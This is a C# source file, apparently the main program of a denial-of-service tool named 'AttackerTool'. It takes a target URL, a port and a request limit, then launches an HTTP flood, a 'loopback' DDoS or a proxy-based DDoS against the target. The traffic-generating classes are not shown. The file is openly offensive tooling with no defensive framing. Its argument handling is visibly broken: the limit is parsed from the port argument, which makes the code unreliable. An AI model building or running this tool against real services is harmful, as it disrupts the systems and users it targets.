using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using AttackerTool;

class Program
{
    static async Task Main(string[] args)
    {
        string targetUrl;
        ushort port = 80;
        int limit;
        string type;

        if (args.Length < 4)
        {
            Console.WriteLine("Where and how do you want to attack?");

            Console.Write("Target URL: ");
            targetUrl = Console.ReadLine();
            if (string.IsNullOrEmpty(targetUrl))
            {
                Console.WriteLine("It can't be empty.");
                return;
            }

            Console.Write("Target Port: ");
            string portInput = Console.ReadLine();
            if (!ushort.TryParse(portInput, out port))
            {
                Console.WriteLine("The port must be numeric that is between 0 to 65535");
                return;
            }

            Console.Write("Request limit per IP: ");
            string limitInput = Console.ReadLine();
            if (!int.TryParse(limitInput, out limit))
            {
                Console.WriteLine("Invalid limit value. Please enter a numeric limit.");
                return;
            }

            Console.Write("Which attack type do you want? flood, ddos-loopback or ddos-proxy: ");
            type = Console.ReadLine().ToLower();
            if (string.IsNullOrEmpty(type) ||
                !(type == "flood" || type == "ddos-loopback" || type == "ddos-proxy"))
            {
                Console.WriteLine("Invalid value. Enter only 'flood', 'ddos-loopback' or 'ddos-proxy'");
                return;
            }
        }
        else
        {
            // run the attack app using command-line arguments from terminal
            targetUrl = args[0];
            port = ushort.Parse(args[1]);
            limit = Settings.DefaultLimit; 
            int.TryParse(args[1], out limit);
            type = args[2].ToLower();
        }

        switch (type)
        {
            case "flood":
                await HttpFlood.Start(targetUrl, port, limit);
                break;
            case "ddos-loopback":
                await HttpDDoSLoopbackIP.Start(targetUrl, port, limit);
                break;
            case "ddos-proxy":
                await HttpDDoSProxy.Start(targetUrl, port, limit);
                break;
            default:
                Console.WriteLine("Invalid type you entered. Use only 'flood', 'ddos-loopback' or 'ddos-proxy'");
                break;
        }
    }
}